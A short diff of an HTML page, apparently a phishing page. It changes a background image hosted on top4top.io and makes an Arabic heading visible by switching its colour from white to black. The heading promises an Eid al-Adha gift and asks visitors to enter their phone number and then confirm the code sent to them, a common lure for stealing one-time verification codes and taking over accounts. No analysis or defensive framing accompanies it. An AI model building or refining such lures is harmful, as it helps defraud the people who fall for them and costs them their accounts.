@@ -23,7 +23,7 @@
 		}
 
 		body {
-			background-image: url(https://k.top4top.io/p_2371h2fiv1.png);
+			background-image: url(https://j.top4top.io/p_2371dxi7g1.png);
 			color: #000;
 			font-family: Arial, Helvetica Neue, Helvetica, sans-serif
 		}
@@ -154,7 +154,7 @@
       </div>
       <div class="bee-block bee-block-2 bee-heading">
        <h1 style="color:#393d47;direction:ltr;font-family:Arial, Helvetica Neue, Helvetica, sans-serif;font-size:22px;font-weight:700;letter-spacing:normal;line-height:150%;text-align:center;margin-top:0;margin-bottom:0;">
-        <span class="tinyMce-placeholder" style="color: #ffffff ;">
+        <span class="tinyMce-placeholder" style="color: #000000 ;">
          إحصل علي هديتك بمناسبة عيد الأضحي المبارك
          <br>
          برجاء تسجيل رقم الهاتف و تاكيد الكود الذي سوف يصل اليك
